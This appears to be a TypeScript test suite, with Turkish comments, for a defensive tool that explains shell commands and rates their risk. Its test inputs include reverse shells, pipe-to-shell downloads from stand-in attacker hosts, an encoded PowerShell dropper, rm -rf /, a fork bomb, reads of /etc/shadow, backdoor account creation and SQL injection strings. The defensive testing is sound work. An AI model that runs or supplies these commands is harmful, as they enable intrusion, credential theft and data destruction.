import assert from 'node:assert';
import { explainCommand, tryDecodePayload } from '../services/commandExplainer';

console.log('================================================================');
console.log('⚡ COMMAND EXPLAINER — FORENSIC EXPLANATION QUALITY AUDIT (50+ TESTS) ⚡');
console.log('================================================================');

let passedTests = 0;
let totalTests = 0;

function runAuditTest(name: string, fn: () => void) {
  totalTests++;
  try {
    fn();
    passedTests++;
    console.log(`✅ [PASS ${totalTests}] ${name}`);
  } catch (err: any) {
    console.error(`❌ [FAIL ${totalTests}] ${name}`);
    console.error(err);
    throw err;
  }
}

// -------------------------------------------------------------
// KATEGORİ 1: 10 MEŞRU WINDOWS KOMUTU (Sıfır False-Positive)
// -------------------------------------------------------------
console.log('\n--- BÖLÜM 1: 10 MEŞRU WINDOWS KOMUTU ---');

runAuditTest('Test 1.1: ipconfig /all -> BİLGİ, ağ tanılama, sisteme zarar vermez', () => {
  const res = explainCommand('ipconfig /all');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
  assert(res.fullNarrativeMarkdown.includes('Ağ Yapılandırması') || res.category.includes('Tanılama'));
  assert(res.fullNarrativeMarkdown.includes('ZARARSIZ') || res.willCauseTroubleText.includes('ZARARSIZ'));
});

runAuditTest('Test 1.2: systeminfo -> BİLGİ, donanım/işletim sistemi bilgisi', () => {
  const res = explainCommand('systeminfo');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

runAuditTest('Test 1.3: whoami (yalın) -> BİLGİ, mevcut kullanıcı adı sorgusu', () => {
  const res = explainCommand('whoami');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
  assert(res.category.includes('Oturum') || res.category.includes('Keşfi'));
});

runAuditTest('Test 1.4: ping 8.8.8.8 -> BİLGİ, ICMP ağ testi', () => {
  const res = explainCommand('ping 8.8.8.8');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

runAuditTest('Test 1.5: tracert google.com -> BİLGİ, rota takibi', () => {
  const res = explainCommand('tracert google.com');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

runAuditTest('Test 1.6: tasklist -> BİLGİ, çalışan süreç listesi', () => {
  const res = explainCommand('tasklist');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

runAuditTest('Test 1.7: PowerShell Get-Process -> BİLGİ, PowerShell süreç listeleme', () => {
  const res = explainCommand('Get-Process');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.ecosystem, 'PowerShell');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

runAuditTest('Test 1.8: PowerShell Get-Service -> BİLGİ, PowerShell servis listeleme', () => {
  const res = explainCommand('Get-Service');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.ecosystem, 'PowerShell');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

runAuditTest('Test 1.9: PowerShell Select-Object -> BİLGİ, ASLA SQL Injection sanılmaz', () => {
  const res = explainCommand('Get-Process | Select-Object -Property Id, ProcessName');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert(!res.category.toLowerCase().includes('sql'), 'Select-Object SQL Injection sanılamaz');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

runAuditTest('Test 1.10: vssadmin list shadows -> BİLGİ, salt okunur gölge kopya sorgusu (delete değil)', () => {
  const res = explainCommand('vssadmin list shadows');
  assert.strictEqual(res.riskLevel, 'BİLGİ', 'vssadmin list komutu salt okunurdur, KRİTİK olamaz');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
  assert(res.category.includes('Read-Only') || res.category.includes('Keşfi'));
});

// -------------------------------------------------------------
// KATEGORİ 2: 10 MEŞRU LINUX KOMUTU (Sıfır False-Positive)
// -------------------------------------------------------------
console.log('\n--- BÖLÜM 2: 10 MEŞRU LINUX KOMUTU ---');

runAuditTest('Test 2.1: systemctl status nginx -> BİLGİ, rutin servis kontrolü', () => {
  const res = explainCommand('systemctl status nginx');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

runAuditTest('Test 2.2: docker ps -a -> BİLGİ, konteyner listesi', () => {
  const res = explainCommand('docker ps -a');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

runAuditTest('Test 2.3: git checkout main -> BİLGİ, sürüm kontrol dalı', () => {
  const res = explainCommand('git checkout main');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

runAuditTest('Test 2.4: df -h -> BİLGİ, disk alanı sorgusu', () => {
  const res = explainCommand('df -h');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

runAuditTest('Test 2.5: free -m -> BİLGİ, bellek kullanım sorgusu', () => {
  const res = explainCommand('free -m');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

runAuditTest('Test 2.6: ps aux -> BİLGİ, süreç listesi', () => {
  const res = explainCommand('ps aux');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

runAuditTest('Test 2.7: uptime -> BİLGİ, çalışma süresi sorgusu', () => {
  const res = explainCommand('uptime');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

runAuditTest('Test 2.8: ls -la /var/log -> BİLGİ, dizin listeleme', () => {
  const res = explainCommand('ls -la /var/log');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

runAuditTest('Test 2.9: curl -I https://example.com -> BİLGİ, HTTP header sorgusu (pipe yok)', () => {
  const res = explainCommand('curl -I https://example.com');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

runAuditTest('Test 2.10: uname -a -> BİLGİ, çekirdek sürüm sorgusu', () => {
  const res = explainCommand('uname -a');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
});

// -------------------------------------------------------------
// KATEGORİ 3: 10 YÜKSEK RİSKLİ WINDOWS KOMUTU
// -------------------------------------------------------------
console.log('\n--- BÖLÜM 3: 10 YÜKSEK RİSKLİ WINDOWS KOMUTU ---');

runAuditTest('Test 3.1: vssadmin delete shadows /all /quiet -> KRİTİK, T1490 gölge kopya silme', () => {
  const res = explainCommand('vssadmin delete shadows /all /quiet');
  assert.strictEqual(res.riskLevel, 'KRİTİK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
  assert.strictEqual(res.mitreTechnique, 'T1490 (Inhibit System Recovery)');
  assert(res.fullNarrativeMarkdown.includes('Birim Gölge'));
});

runAuditTest('Test 3.2: certutil -urlcache -split -f http://evil.com/b.exe -> YÜKSEK, T1105 LOLBAS indirme', () => {
  const res = explainCommand('certutil.exe -urlcache -split -f http://evil.com/b.exe C:\\b.exe');
  assert.strictEqual(res.riskLevel, 'YÜKSEK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
  assert(res.mitreTechnique?.includes('T1105'));
});

runAuditTest('Test 3.3: bitsadmin /transfer -> YÜKSEK, BITS dosya aktarımı', () => {
  const res = explainCommand('bitsadmin /transfer eviljob http://evil.com/payload.exe C:\\temp\\p.exe');
  assert.strictEqual(res.riskLevel, 'YÜKSEK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
  assert(res.mitreTechnique?.includes('T1197') || res.mitreTechnique?.includes('T1105'));
});

runAuditTest('Test 3.4: net user hacker Pass123! /add -> KRİTİK, yerel hesap ekleme', () => {
  const res = explainCommand('net user hacker P@ssw0rd123 /add');
  assert.strictEqual(res.riskLevel, 'KRİTİK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
  assert(res.mitreTechnique?.includes('T1136.001'));
});

runAuditTest('Test 3.5: net localgroup administrators hacker /add -> KRİTİK, yönetici grubuna ekleme', () => {
  const res = explainCommand('net localgroup administrators hacker /add');
  assert.strictEqual(res.riskLevel, 'KRİTİK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
});

runAuditTest('Test 3.6: reg add ... Run key -> YÜKSEK, T1547.001 kalıcılık sağlama', () => {
  const res = explainCommand('reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\temp\\update.exe');
  assert.strictEqual(res.riskLevel, 'YÜKSEK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
  assert(res.mitreTechnique?.includes('T1547.001'));
});

runAuditTest('Test 3.7: powershell -nop -w hidden -ep bypass downloadstring -> KRİTİK, dosyasız dropper', () => {
  const res = explainCommand('powershell.exe -nop -w hidden -ep bypass (New-Object Net.WebClient).DownloadString("http://attacker/p.ps1")');
  assert.strictEqual(res.riskLevel, 'KRİTİK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
  assert(res.mitreTechnique?.includes('T1059.001'));
});

runAuditTest('Test 3.8: rundll32.exe -> YÜKSEK, T1218 LOLBAS DLL yürütme', () => {
  const res = explainCommand('rundll32.exe C:\\temp\\evil.dll,EntryPoint');
  assert.strictEqual(res.riskLevel, 'YÜKSEK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
  assert(res.mitreTechnique?.includes('T1218'));
});

runAuditTest('Test 3.9: regsvr32 /s /u /i:http://evil.com/a.sct -> YÜKSEK, Squiblydoo tekniği', () => {
  const res = explainCommand('regsvr32 /s /u /i:http://attacker.com/script.sct scrobj.dll');
  assert.strictEqual(res.riskLevel, 'YÜKSEK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
});

runAuditTest('Test 3.10: mshta http://attacker.com/payload.hta -> YÜKSEK, HTA yürütücü', () => {
  const res = explainCommand('mshta http://attacker.com/payload.hta');
  assert.strictEqual(res.riskLevel, 'YÜKSEK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
});

// -------------------------------------------------------------
// KATEGORİ 4: 10 YÜKSEK RİSKLİ LINUX KOMUTU
// -------------------------------------------------------------
console.log('\n--- BÖLÜM 4: 10 YÜKSEK RİSKLİ LINUX KOMUTU ---');

runAuditTest('Test 4.1: bash -i >& /dev/tcp/10.10.10.10/4444 0>&1 -> KRİTİK, interaktif ters kabuk', () => {
  const res = explainCommand('bash -i >& /dev/tcp/10.10.10.10/4444 0>&1');
  assert.strictEqual(res.riskLevel, 'KRİTİK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
  assert(res.category.includes('Ters Kabuk'));
});

runAuditTest('Test 4.2: curl -s http://evil.com/sh | bash -> KRİTİK, pipe-to-shell RCE', () => {
  const res = explainCommand('curl -s http://evil.com/setup.sh | bash');
  assert.strictEqual(res.riskLevel, 'KRİTİK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
  assert(res.category.includes('Pipe'));
});

runAuditTest('Test 4.3: wget -qO- http://evil.com/sh | sh -> KRİTİK, pipe-to-shell RCE', () => {
  const res = explainCommand('wget -qO- http://evil.com/sh | sh');
  assert.strictEqual(res.riskLevel, 'KRİTİK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
});

runAuditTest('Test 4.4: rm -rf / -> KRİTİK, tüm dosya sistemini silen yıkıcı komut', () => {
  const res = explainCommand('rm -rf / --no-preserve-root');
  assert.strictEqual(res.riskLevel, 'KRİTİK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
  assert(res.mitreTechnique?.includes('T1485'));
});

runAuditTest('Test 4.5: rm -rf /* -> KRİTİK, kök dizin silme', () => {
  const res = explainCommand('rm -rf /*');
  assert.strictEqual(res.riskLevel, 'KRİTİK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
});

runAuditTest('Test 4.6: cat /etc/shadow -> KRİTİK, parola hash dosyasına erişim', () => {
  const res = explainCommand('cat /etc/shadow');
  assert.strictEqual(res.riskLevel, 'KRİTİK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
  assert(res.mitreTechnique?.includes('T1003.008'));
});

runAuditTest('Test 4.7: nc -e /bin/sh 10.10.10.10 4444 -> KRİTİK, netcat ters kabuk', () => {
  const res = explainCommand('nc -e /bin/sh 10.10.10.10 4444');
  assert.strictEqual(res.riskLevel, 'KRİTİK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
});

runAuditTest('Test 4.8: mkfifo /tmp/f ... nc -> KRİTİK, mkfifo ters kabuk', () => {
  const res = explainCommand('rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4444 >/tmp/f');
  assert.strictEqual(res.riskLevel, 'KRİTİK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
});

runAuditTest('Test 4.9: chmod 777 /etc/passwd -> ORTA, aşırı izin verme', () => {
  const res = explainCommand('chmod 777 /etc/passwd');
  assert.strictEqual(res.riskLevel, 'ORTA');
  assert.strictEqual(res.willCauseTrouble, 'POTANSIYEL');
});

runAuditTest('Test 4.10: Fork Bomb :(){ :|:& };: -> KRİTİK, DoS kaynak tüketimi', () => {
  const res = explainCommand(':(){ :|:& };:');
  assert.strictEqual(res.riskLevel, 'KRİTİK');
  assert.strictEqual(res.willCauseTrouble, 'EVET_YUKSEK');
});

// -------------------------------------------------------------
// KATEGORİ 5: 5 OBFUSCATED / GİZLENMİŞ KOMUT & DEOBFUSCATION
// -------------------------------------------------------------
console.log('\n--- BÖLÜM 5: 5 OBFUSCATED KOMUT & DEOBFUSCATION ---');

runAuditTest('Test 5.1: PowerShell UTF-16LE Base64 -> Çözülür ve IEX/WebClient ortaya çıkar', () => {
  // Encodes: IEX (New-Object Net.WebClient).DownloadString('http://attacker.local/payload.ps1')
  const cmd = 'powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AbABvAGMAYQBsAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==';
  const res = explainCommand(cmd);
  assert(res.decodedPayload !== undefined, 'Base64 yükü çözülmelidir');
  assert(res.decodedPayload?.includes('DownloadString'), 'Çözülen kodda DownloadString yer almalıdır');
  assert.strictEqual(res.riskLevel, 'KRİTİK');
});

runAuditTest('Test 5.2: Bash Base64 pipe echo ... | base64 -d -> Çözülür', () => {
  const raw = 'echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh';
  const res = explainCommand(raw);
  assert(res.decodedPayload !== undefined);
  assert.strictEqual(res.decodedPayload, 'cat /etc/passwd');
});

runAuditTest('Test 5.3: URL Encoded SQLi -> %20 %27 %3B çözülür', () => {
  const raw = 'admin%27%20UNION%20SELECT%20null,username,password%20FROM%20users--';
  const decoded = tryDecodePayload(raw);
  assert(decoded !== null);
  assert(decoded?.includes("' UNION SELECT"));
});

runAuditTest('Test 5.4: URL Encoded Path Traversal -> %2e%2e%2f çözülür', () => {
  const raw = 'GET /view?file=%2e%2e%2f%2e%2e%2fwin.ini HTTP/1.1';
  const res = explainCommand(raw);
  assert.strictEqual(res.riskLevel, 'YÜKSEK');
  assert(res.category.includes('Path Traversal') || res.category.includes('Dizin'));
});

runAuditTest('Test 5.5: Certutil -decode obfuscated file -> YÜKSEK', () => {
  const res = explainCommand('certutil.exe -decode payload.txt payload.exe');
  assert.strictEqual(res.riskLevel, 'YÜKSEK');
  assert(res.category.includes('Deobfuscation') || res.category.includes('Çözme'));
});

// -------------------------------------------------------------
// KATEGORİ 6: 5 AMBIGUOUS / CONTEXT-DEPENDENT KOMUT
// -------------------------------------------------------------
console.log('\n--- BÖLÜM 6: 5 AMBIGUOUS / CONTEXT-DEPENDENT KOMUT ---');

runAuditTest('Test 6.1: whoami vs whoami /priv -> whoami BİLGİ iken whoami /priv ORTA risk olur', () => {
  const plainWhoami = explainCommand('whoami');
  const privWhoami = explainCommand('whoami /priv');
  assert.strictEqual(plainWhoami.riskLevel, 'BİLGİ');
  assert.strictEqual(privWhoami.riskLevel, 'ORTA');
  assert(privWhoami.tokens.some((t) => t.token === '/priv'));
});

runAuditTest('Test 6.2: certutil -hashfile vs certutil -urlcache -> Hash BİLGİ iken urlcache YÜKSEK risk', () => {
  const hashCmd = explainCommand('certutil -hashfile setup.exe SHA256');
  const dlCmd = explainCommand('certutil -urlcache -split -f http://evil.com/b.exe');
  assert.strictEqual(hashCmd.riskLevel, 'BİLGİ');
  assert.strictEqual(dlCmd.riskLevel, 'YÜKSEK');
});

runAuditTest('Test 6.3: bitsadmin /list vs bitsadmin /transfer -> list BİLGİ iken transfer YÜKSEK risk', () => {
  const listCmd = explainCommand('bitsadmin /list');
  const transferCmd = explainCommand('bitsadmin /transfer evil http://evil.com/b.exe C:\\b.exe');
  assert.strictEqual(listCmd.riskLevel, 'BİLGİ');
  assert.strictEqual(transferCmd.riskLevel, 'YÜKSEK');
});

runAuditTest('Test 6.4: Standart SELECT ... FROM -> BİLGİ (Asla SQLi sanılmaz)', () => {
  const res = explainCommand('SELECT id, username, email FROM customers WHERE active = 1');
  assert.strictEqual(res.riskLevel, 'BİLGİ');
  assert.strictEqual(res.willCauseTrouble, 'HAYIR_GUVENLI');
  assert(res.category.includes('Veritabanı Sorgusu'));
});

runAuditTest('Test 6.5: Log Bağlamı (Context) aktarıldığında adli dille yansıtılır', () => {
  const context = {
    username: 'SYSTEM',
    host: 'DC-PRIMARY-01',
    parentProcess: 'cmd.exe',
    processName: 'vssadmin.exe',
    eventId: 4688,
  };
  const res = explainCommand('vssadmin delete shadows /all /quiet', context);
  assert(res.context !== undefined);
  assert.strictEqual(res.context.username, 'SYSTEM');
  assert.strictEqual(res.context.host, 'DC-PRIMARY-01');
  assert(res.fullNarrativeMarkdown.includes('DC-PRIMARY-01'));
  assert(res.fullNarrativeMarkdown.includes('SYSTEM'));
  assert(res.fullNarrativeMarkdown.includes('cmd.exe'));
});

// -------------------------------------------------------------
// KATEGORİ 7: EXPLANATION COMPLETENESS & ADLI METİN TESTLERİ
// -------------------------------------------------------------
console.log('\n--- BÖLÜM 7: EXPLANATION COMPLETENESS VE ADLİ DİL TESTLERİ ---');

runAuditTest('Test 7.1: Tüm 6 soruya yanıt verilmeli (📌 1, 🛠️ 2, ⚠️ 3, 💥 4, 🔍 5, 🛡️ 6)', () => {
  const res = explainCommand('powershell.exe -nop -w hidden -enc AQIDBA==');
  const md = res.fullNarrativeMarkdown;
  assert(md.includes('1. Bu Komut Nedir ve Temel Amacı'), 'Soru 1 bulunmalıdır');
  assert(md.includes('2. Normal Şartlarda Nerelerde ve Kimler Tarafından'), 'Soru 2 bulunmalıdır');
  assert(md.includes('3. Güvenlik Değerlendirmesi: Saldırganlar Bunu Nasıl'), 'Soru 3 bulunmalıdır');
  assert(md.includes('4. Bu Komut Çalışırsa Sistemde Ne Sorun Çıkartır?'), 'Soru 4 bulunmalıdır');
  assert(md.includes('5. Adım Adım Parametre ve Bayrak'), 'Soru 5 bulunmalıdır');
  assert(md.includes('6. Bir Sistemci veya SOC Analisti Bu Komutu Gördüğünde'), 'Soru 6 bulunmalıdır');
});

runAuditTest('Test 7.2: Meta uyarılar (Adli Metodoloji Uyarısı / Caveat) kullanıcı çıktısından arındırılmalı', () => {
  const res = explainCommand('vssadmin delete shadows /all /quiet');
  assert(!res.fullNarrativeMarkdown.includes('Adli Metodoloji Uyarısı'), 'Kullanıcı çıktısında meta uyarı yer almamalı');
  assert(!res.fullNarrativeMarkdown.includes('Forensic Caveat'), 'Kullanıcı çıktısında Forensic Caveat yer almamalı');
  assert(res.forensicCaveat !== undefined, 'İç adli metin nesnede korunmalı');
});

runAuditTest('Test 7.3: Eksik bağlam uydurulmamalı (Bilinmeyen alanlar belirtilmeli)', () => {
  const partialContext = {
    host: 'WEB-SRV-01',
    // username and parentProcess omitted!
  };
  const res = explainCommand('whoami /priv', partialContext);
  assert(res.fullNarrativeMarkdown.includes('Kullanıcı Hesabı') && res.fullNarrativeMarkdown.includes('Bilinmiyor'));
  assert(res.fullNarrativeMarkdown.includes('Üst Süreç (Parent Process)') && res.fullNarrativeMarkdown.includes('Bilinmiyor'));
});

console.log('================================================================');
console.log(`🎉 TÜM TESTLER BAŞARIYLA TAMAMLANDI: ${passedTests} / ${totalTests} (Sıfır Hata)`);
console.log('================================================================');
